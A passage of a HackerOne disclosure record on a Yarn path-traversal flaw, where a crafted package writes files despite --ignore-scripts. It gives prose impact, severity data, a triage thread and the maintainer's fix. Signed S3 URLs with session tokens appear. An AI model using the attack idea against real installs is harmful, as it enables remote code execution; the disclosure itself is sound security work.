yet.\u003c/p\u003e\n\n\u003ch2 id=\"supporting-material-references\"\u003eSupporting Material/References:\u003c/h2\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eState all technical information about the stack where the vulnerability was found\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cul\u003e\n\u003cli\u003eLinux/OSX\u003c/li\u003e\n\u003cli\u003ev12.3.1\u003c/li\u003e\n\u003cli\u003e6.9.0\u003c/li\u003e\n\u003cli\u003egtar OSX (1.32)\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch1 id=\"wrap-up\"\u003eWrap up\u003c/h1\u003e\n\n\u003cul\u003e\n\u003cli\u003eI contacted the maintainer to let them know: Y\u003c/li\u003e\n\u003cli\u003eI opened an issue in the related repository: N\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch1 id=\"please-copy-in-a-photo-of-two-great-australian-shepherds\"\u003ePlease copy in a photo of two great Australian Shepherds\u003c/h1\u003e\n\n\u003cp\u003ePlease see attached photo.\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003cp\u003eAn attacker bypasses the claims that \u003ccode\u003e--ignore-scripts\u003c/code\u003e and other hardening measures will lead to less chance of remote code execution. As such, security conscious users of Yarn will be exposed when installing packages which make use of this attack -- as will companies who download and package Yarn dependancies on behalf of end-users in sandboxes (for example, company x receives a list of packages + custom functions from an end-user, and builds them in their build servers).\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eYarn generally claims that unless post/pre-install hooks are present, there is little chance of remote code execution. A through review of source code does not protect against this attack; as the attack does not live in NodeJS, nor the package.json - it is in the structure of the package itself. \u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eFor example, Bob messages Alice and says \u0026quot;I have pushed the code to xyz on NPM, can you take a look?\u0026quot; - Alice downloads the package using all of the secure flags (\u003ccode\u003e--ignore-scripts\u003c/code\u003e, \u003ccode\u003e--no-default-rc\u003c/code\u003e) - yet Bob is still able to write files on Alice\u0026#39;s system, possibly leading to RCE.\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eFinally, in the event of a package being published maliciously (as what has been seen previously), a popular package may have an additional vector in which it can be weaponized.\u003c/p\u003e\u003c/li\u003e\n\u003c/ul\u003e\n","weakness":{"id":19,"name":"Path Traversal"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":626975,"file_name":"sheps.jpg","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/DK4TXehx4VbyTssfFKsT65eu?response-content-disposition=attachment%3B%20filename%3D%22sheps.jpg%22%3B%20filename%2A%3DUTF-8%27%27sheps.jpg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRVDVIAIN%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T064259Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCIE32Mqh2tZr%2BOU5TpCkMAcCIP7cUR4Cmx6knF0aE1pAIhANosl%2BxHV6Q%2F51LP%2Fec3HeAsrkcv3Oonagtggk2l2fcHKrQDCFYQARoMMDEzNjE5Mjc0ODQ5IgyvivkNb%2F%2FihtanvJsqkQOxVl0vet745bZV8lQI5KYtwTWpcIFAsML7JxymD3vn9i8QCWhlYeT2MW%2B9baTQMb%2BdveMhrdwbKcBh3ip%2ByweQnVl9ueQzetzoXpB5k2WZrDCF3m0PA%2BCv6ox3XmJRewIkURiq4Ztl%2BHyUPdAtuOYZDYkHGUB8OqZgDmy0YoWLDqNPzGZK7dX7v62QUuo2TiCO%2BWHnWiVN2sIAHkLQ1c0cRYR2hre0%2FHfkXdHak9EM%2FJlTAH%2BQnt3DZGo6v788Hni0I1X%2F70QyGnfzTEgA8%2Fvb6vKESyULs14SrfKtlo9En1u2T1%2B79JNxVdhJNX%2BfERg06V3dMkcO%2BhECVPAWHzRrJ3bTOIIfgttUE3yW5ViJmecveb28ezf1szEuiXvW%2BZQUdTtFctgvSq22L57hu2QitzJ%2F7EFXuPPyfSKn70goiFML2nsYjayzP2jOzI85Wf0PZwwCg%2BTr7Ldre4VPxLs2y%2BAhqKPahi9iLDrk5IVFZPWBWrmRjgRlhjIP7aYZzYQEoqoD%2F3susXDMHlsiMv8yoDDN6ar%2FBTrqAdSZzhKXhWU9aDM9pF9urQto0LgyoOSxshu8McAhBrfa%2FReNxxcISybiMxPssa8oRShR7XUSBWuVRE7CnX5MQKY6UeaUB8HDokdym3sz7IA0tuq64XmfywVqSVqOZTRnXaNG%2BObO1m4FlOQ%2FC4n%2Fbe50N8rAEPnkWd81lyuaeMezjo4O%2BlEpCZ%2ByBXnfl88Bjx8KUaMIVJ5VHQ8J6PBiG%2FjOWow2rty2SDO%2BTqlQJxjPwbenYT7WUyEPOBmi%2FZgSy9qD6EP%2B5GMYGk0q2R6LmuTGm6QPTGNHaZ%2BHqK3PMyvOo0eC1hMcq6KJ8g%3D%3D\u0026X-Amz-Signature=731b3bf78982d2af3b063553aa38a9a9f4562f6d62d0a155748dfaa4506b4294","file_size":110810,"type":"image/jpeg"}],"allow_singular_disclosure_at":"2020-03-08T08:58:09.640Z","allow_singular_disclosure_after":-25566289.94980996,"singular_disclosure_allowed":true,"vote_count":2,"voters":["bl4de","d3nn15"],"severity":{"rating":"medium","score":6.1,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"high","privileges_required":"none","user_interaction":"required","scope":"changed","confidentiality":"none","integrity":"high","availability":"none"}},"structured_scope":{"databaseId":56841,"asset_type":"DOWNLOADABLE_EXECUTABLES","asset_identifier":"yarn","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":6230704,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi team,\n\nIt should also be noted that yarn is present in the official node docker images listed at https://hub.docker.com/_/node/.\n\nCheers,\nRhys","markdown_message":"\u003cp\u003eHi team,\u003c/p\u003e\n\n\u003cp\u003eIt should also be noted that yarn is present in the official node docker images listed at \u003ca title=\"https://hub.docker.com/_/node/\" href=\"/redirect?url=https%3A%2F%2Fhub.docker.com%2F_%2Fnode%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://hub.docker.com/_/node/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n\n\u003cp\u003eCheers,\u003cbr\u003e\nRhys\u003c/p\u003e\n","automated_response":false,"created_at":"2019-11-06T11:31:31.651Z","updated_at":"2019-11-06T11:31:31.651Z","actor":{"username":"rhyselsmore","cleared":false,"url":"/rhyselsmore","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6238846,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @rhyselsmore,\n\nThank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\n\nKind regards,\n@beagle ","markdown_message":"\u003cp\u003eHi \u003ca href=\"/rhyselsmore\"\u003e@rhyselsmore\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\u003c/p\u003e\n\n\u003cp\u003eKind regards,\u003cbr\u003e\n\u003ca href=\"/beagle\"\u003e@beagle\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2019-11-07T08:11:05.719Z","updated_at":"2019-11-07T08:11:05.719Z","actor":{"username":"beagle","cleared":false,"url":"/beagle","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/458/833/024b7a83a4a54282cbcdf96b9b10a93700cf8743_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6292160,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi team,\n\nI‚Äôm sorry to be a bother, but is there any update on this?","markdown_message":"\u003cp\u003eHi team,\u003c/p\u003e\n\n\u003cp\u003eI‚Äôm sorry to be a bother, but is there any update on this?\u003c/p\u003e\n","automated_response":false,"created_at":"2019-11-12T21:28:04.990Z","updated_at":"2019-11-12T21:28:04.990Z","actor":{"username":"rhyselsmore","cleared":false,"url":"/rhyselsmore","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6317006,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2019-11-15T15:00:05.212Z","updated_at":"2019-11-15T15:00:05.212Z","additional_data":{"old_severity":"High","new_severity":"High (7.4)","old_severity_id":557164,"new_severity_id":566677},"actor":{"username":"beagle","cleared":false,"url":"/beagle","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/458/833/024b7a83a4a54282cbcdf96b9b10a93700cf8743_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6317098,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2019-11-15T15:14:19.470Z","updated_at":"2019-11-15T15:14:19.470Z","additional_data":{"old_severity":"High (7.4)","new_severity":"Medium (6.1)","old_severity_id":566677,"new_severity_id":566692},"actor":{"username":"beagle","cleared":false,"url":"/beagle","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/458/833/024b7a83a4a54282cbcdf96b9b10a93700cf8743_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6317099,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"I was able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.\n\nKind regards,\n@beagle  ","markdown_message":"\u003cp\u003eI was able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.\u003c/p\u003e\n\n\u003cp\u003eKind regards,\u003cbr\u003e\n\u003ca href=\"/beagle\"\u003e@beagle\u003c/a\u003e  \u003c/p\u003e\n","automated_response":false,"created_at":"2019-11-15T15:14:22.737Z","updated_at":"2019-11-15T15:14:22.737Z","actor":{"username":"beagle","cleared":false,"url":"/beagle","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/458/833/024b7a83a4a54282cbcdf96b9b10a93700cf8743_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6387878,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks team - out of interest, will there be a CVE attached to this?","markdown_message":"\u003cp\u003eThanks team - out of interest, will there be a CVE attached to this?\u003c/p\u003e\n","automated_response":false,"created_at":"2019-11-24T04:00:10.703Z","updated_at":"2019-11-24T04:00:10.703Z","actor":{"username":"rhyselsmore","cleared":false,"url":"/rhyselsmore","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6392721,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@rhyselsmore I suspect it will, but I'd like to confirm this with the maintainer first.","markdown_message":"\u003cp\u003e\u003ca href=\"/rhyselsmore\"\u003e@rhyselsmore\u003c/a\u003e I suspect it will, but I\u0026#39;d like to confirm this with the maintainer first.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-11-25T08:25:07.661Z","updated_at":"2019-11-25T08:25:07.661Z","actor":{"username":"marcinhoppe","cleared":false,"url":"/marcinhoppe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6392731,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@arcanis can you take a look at this report? ","markdown_message":"\u003cp\u003e\u003ca href=\"/arcanis\"\u003e@arcanis\u003c/a\u003e can you take a look at this report? \u003c/p\u003e\n","automated_response":false,"created_at":"2019-11-25T08:26:37.995Z","updated_at":"2019-11-25T08:26:37.995Z","actor":{"username":"marcinhoppe","cleared":false,"url":"/marcinhoppe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6547381,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","markdown_message":"","automated_response":false,"created_at":"2019-12-14T10:29:55.283Z","updated_at":"2019-12-14T10:29:55.283Z","actor":{"username":"arcanis","cleared":false,"url":"/arcanis","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/EsbrQMX6UibsxVnUpxG8gLi7/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6837578,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, apologies for the delay - we're working on the next major release (which features a completely different cache implementation) so the 1.x branch is getting less love these days.\n\nThis report looks correct (and very well documented, kudos!), and I've started implementing a fix that you can see here:\nhttps://github.com/yarnpkg/yarn/pull/7831/files\n\n@rhyselsmore Can you confirm this look like the correct fix per your findings? Your \"malicious\" package seems to have been taken down, but I recreated it on my side and it seemed to prevent the problem you described. If everything looks good I'll release it in a patch release today or tomorrow.","markdown_message":"\u003cp\u003eHi, apologies for the delay - we\u0026#39;re working on the next major release (which features a completely different cache implementation) so the 1.x branch is getting less love these days.\u003c/p\u003e\n\n\u003cp\u003eThis report looks correct (and very well documented, kudos!), and I\u0026#39;ve started implementing a fix that you can see here:\u003cbr\u003e\n\u003ca title=\"https://github.com/yarnpkg/yarn/pull/7831/files\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fyarnpkg%2Fyarn%2Fpull%2F7831%2Ffiles\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/yarnpkg/yarn/pull/7831/files\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003ca href=\"/rhyselsmore\"\u003e@rhyselsmore\u003c/a\u003e Can you confirm this look like the correct fix per your findings? Your \u0026quot;malicious\u0026quot; package seems to have been taken down, but I recreated it on my side and it seemed to prevent the problem you described. If everything looks good I\u0026#39;ll release it in a patch release today or tomorrow.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-22T09:31:16.187Z","updated_at":"2020-01-22T09:31:16.187Z","actor":{"username":"arcanis","cleared":false,"url":"/arcanis","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/EsbrQMX6UibsxVnUpxG8gLi7/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6848610,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@arcanis Many thanks for an update. When do you think this PR will land? I would like to make sure we coordinate the disclosure with yarn release.\n\nI also reached out to @rhyselsmore on the Node Security WG Slack to weigh in on this fix.","markdown_message":"\u003cp\u003e\u003ca href=\"/arcanis\"\u003e@arcanis\u003c/a\u003e Many thanks for an update. When do you think this PR will land? I would like to make sure we coordinate the disclosure with yarn release.\u003c/p\u003e\n\n\u003cp\u003eI also reached out to \u003ca href=\"/rhyselsmore\"\u003e@rhyselsmore\u003c/a\u003e on the Node Security WG Slack to weigh in on this fix.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-23T10:50:00.168Z","updated_at":"2020-01-23T10:50:00.168Z","actor":{"username":"marcinhoppe","cleared":false,"url":"/marcinhoppe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6849378,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We'll be releasing tomorrow Yarn 2, so I would think preferable to avoid releasing a 1.x at the same time (if only because the 1.x release will be buried under many other information). Jan 31 or Feb 7 would be a better date, and would leave some time to @rhyselsmore to review my fix. Does that sound good?","markdown_message":"\u003cp\u003eWe\u0026#39;ll be releasing tomorrow Yarn 2, so I would think preferable to avoid releasing a 1.x at the same time (if only because the 1.x release will be buried under many other information). Jan 31 or Feb 7 would be a better date, and would leave some time to \u003ca href=\"/rhyselsmore\"\u003e@rhyselsmore\u003c/a\u003e to review my fix. Does that sound good?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-23T12:58:43.717Z","updated_at":"2020-01-23T12:58:43.717Z","actor":{"username":"arcanis","cleared":false,"url":"/arcanis","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/EsbrQMX6UibsxVnUpxG8gLi7/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6860229,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@arcanis sounds perfect. We will disclose after `yarn` 1.x has been released.","markdown_message":"\u003cp\u003e\u003ca href=\"/arcanis\"\u003e@arcanis\u003c/a\u003e sounds perfect. We will disclose after \u003ccode\u003eyarn\u003c/code\u003e 1.x has been released.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-24T10:42:53.677Z","updated_at":"2020-01-24T10:42:53.677Z","actor":{"username":"marcinhoppe","cleared":false,"url":"/marcinhoppe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6977213,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Looks like yarn 1.22 with the fixed has been released.\n\n@rhyselsmore @beagle can you verify this vulnerability has been fixed?","markdown_message":"\u003cp\u003eLooks like yarn 1.22 with the fixed has been released.\u003c/p\u003e\n\n\u003cp\u003e\u003ca href=\"/rhyselsmore\"\u003e@rhyselsmore\u003c/a\u003e \u003ca href=\"/beagle\"\u003e@beagle\u003c/a\u003e can you verify this vulnerability has been fixed?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-02-06T09:31:41.474Z","updated_at":"2020-02-06T09:31:41.474Z","actor":{"username":"marcinhoppe","cleared":false,"url":"/marcinhoppe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6977763,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @marcinhoppe,\n\nThis appears to be resolved:\n\n{F707841}\n\n{F707842}\n\n@rhyselsmore do you think a correct fix has been implemented?\n\nKind regards,\n@beagle ","markdown_message":"\u003cp\u003eHi \u003ca href=\"/marcinhoppe\"\u003e@marcinhoppe\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThis appears to be resolved:\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Screenshot_2020-02-06_at_12.03.16.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/W25D3yJd7aREuMkF3GtqCrPT?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2020-02-06_at_12.03.16.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2020-02-06_at_12.03.16.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQRVDVIAIN%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T064259Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCIE32Mqh2tZr%2BOU5TpCkMAcCIP7cUR4Cmx6knF0aE1pAIhANosl%2BxHV6Q%2F51LP%2Fec3HeAsrkcv3Oonagtggk2l2fcHKrQDCFYQARoMMDEzNjE5Mjc0ODQ5IgyvivkNb%2F%2FihtanvJsqkQOxVl0vet745bZV8lQI5KYtwTWpcIFAsML7JxymD3vn9i8QCWhlYeT2MW%2B9baTQMb%2BdveMhrdwbKcBh3ip%2ByweQnVl9ueQzetzoXpB5k2WZrDCF3m0PA%2BCv6ox3XmJRewIkURiq4Ztl%2BHyUPdAtuOYZDYkHGUB8OqZgDmy0YoWLDqNPzGZK7dX7v62QUuo2TiCO%2BWHnWiVN2sIAHkLQ1c0cRYR2hre0%2FHfkXdHak9EM%2FJlTAH%2BQnt3DZGo6v788Hni0I1X%2F70QyGnfzTEgA8%2Fvb6vKESyULs14SrfKtlo9En1u2T1%2B79JNxVdhJNX%2BfERg06V3dMkcO%2BhECVPAWHzRrJ3bTOIIfgttUE3yW5ViJmecveb28ezf1szEuiXvW%2BZQUdTtFctgvSq22L57hu2QitzJ%2F7EFXuPPyfSKn70goiFML2nsYjayzP2jOzI85Wf0PZwwCg%2BTr7Ldre4VPxLs2y%2BAhqKPahi9iLDrk5IVFZPWBWrmRjgRlhjIP7aYZzYQEoqoD%2F3susXDMHlsiMv8yoDDN6ar%2FBTrqAdSZzhKXhWU9aDM9pF9urQto0LgyoOSxshu8McAhBrfa%2FReNxxcISybiMxPssa8oRShR7XUSBWuVRE7CnX5MQKY6UeaUB8HDokdym3sz7IA0tuq64XmfywVqSVqOZTRnXaNG%2BObO1m4FlOQ%2FC4n%2Fbe50N8rAEPnkWd81lyuaeMezjo4O%2BlEpCZ%2ByBXnfl88Bjx8KUaMIVJ5VHQ8J6PBiG%2FjOWow2rty2SDO%2BTqlQJxjPwbenYT7WUyEPOBmi%2FZgSy9qD6EP%2B5GMYGk0q2R6LmuTGm6QPTGNHaZ%2BHqK3PMyvOo0eC1hMcq6KJ8g%3D%3D\u0026amp;X-Amz-Signature=592bc714c3e8ee9c87fd0eb15c436c6840b8d5869e7414e51ae6c90901d71a17\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/W25D3yJd7aREuMkF3GtqCrPT?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2020-02-06_at_12.03.16.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2020-02-06_at_12.03.16.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQRVDVIAIN%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T064259Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCIE32Mqh2tZr%2BOU5TpCkMAcCIP7cUR4Cmx6knF0aE1pAIhANosl%2BxHV6Q%2F51LP%2Fec3HeAsrkcv3Oonagtggk2l2fcHKrQDCFYQARoMMDEzNjE5Mjc0ODQ5IgyvivkNb%2F%2FihtanvJsqkQOxVl0vet745bZV8lQI5KYtwTWpcIFAsML7JxymD3vn9i8QCWhlYeT2MW%2B9baTQMb%2BdveMhrdwbKcBh3ip%2ByweQnVl9ueQzetzoXpB5k2WZrDCF3m0PA%2BCv6ox3XmJRewIkURiq4Ztl%2BHyUPdAtuOYZDYkHGUB8OqZgDmy0YoWLDqNPzGZK7dX7v62QUuo2TiCO%2BWHnWiVN2sIAHkLQ1c0cRYR2hre0%2FHfkXdHak9EM%2FJlTAH%2BQnt3DZGo6v788Hni0I1X%2F70QyGnfzTEgA8%2Fvb6vKESyULs14SrfKtlo9En1u2T1%2B79JNxVdhJNX%2BfERg06V3dMkcO%2BhECVPAWHzRrJ3bTOIIfgttUE3yW5ViJmecveb28ezf1szEuiXvW%2BZQUdTtFctgvSq22L57hu2QitzJ%2F7EFXuPPyfSKn70goiFML2nsYjayzP2jOzI85Wf0PZwwCg%2BTr7Ldre4VPxLs2y%2BAhqKPahi9iLDrk5IVFZPWBWrmRjgRlhjIP7aYZzYQEoqoD%2F3susXDMHlsiMv8yoDDN6ar%2FBTrqAdSZzhKXhWU9aDM9pF9urQto0LgyoOSxshu8McAhBrfa%2FReNxxcISybiMxPssa8oRShR7XUSBWuVRE7CnX5MQKY6UeaUB8HDokdym3sz7IA0tuq64XmfywVqSVqOZTRnXaNG%2BObO1m4FlOQ%2FC4n%2Fbe50N8rAEPnkWd81lyuaeMezjo4O%2BlEpCZ%2ByBXnfl88Bjx8KUaMIVJ5VHQ8J6PBiG%2FjOWow2rty2SDO%2BTqlQJxjPwbenYT7WUyEPOBmi%2FZgSy9qD6EP%2B5GMYGk0q2R6LmuTGm6QPTGNHaZ%2BHqK3PMyvOo0eC1hMcq6KJ8g%3D%3D\u0026amp;X-Amz-Signature=592bc714c3e8ee9c87fd0eb15c436c6840b8d5869e7414e51ae6c90901d71a17\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Screenshot_2020-02-06_at_12.03.26.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/CPvjSk5gW5fXFF6HGc2iMd56?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2020-02-06_at_12.03.26.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2020-02-06_at_12.03.26.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQRVDVIAIN%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T064259Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCIE32Mqh2tZr%2BOU5TpCkMAcCIP7cUR4Cmx6knF0aE1pAIhANosl%2BxHV6Q%2F51LP%2Fec3HeAsrkcv3Oonagtggk2l2fcHKrQDCFYQARoMMDEzNjE5Mjc0ODQ5IgyvivkNb%2F%2FihtanvJsqkQOxVl0vet745bZV8lQI5KYtwTWpcIFAsML7JxymD3vn9i8QCWhlYeT2MW%2B9baTQMb%2BdveMhrdwbKcBh3ip%2ByweQnVl9ueQzetzoXpB5k2WZrDCF3m0PA%2BCv6ox3XmJRewIkURiq4Ztl%2BHyUPdAtuOYZDYkHGUB8OqZgDmy0YoWLDqNPzGZK7dX7v62QUuo2TiCO%2BWHnWiVN2sIAHkLQ1c0cRYR2hre0%2FHfkXdHak9EM%2FJlTAH%2BQnt3DZGo6v788Hni0I1X%2F70QyGnfzTEgA8%2Fvb6vKESyULs14SrfKtlo9En1u2T1%2B79JNxVdhJNX%2BfERg06V3dMkcO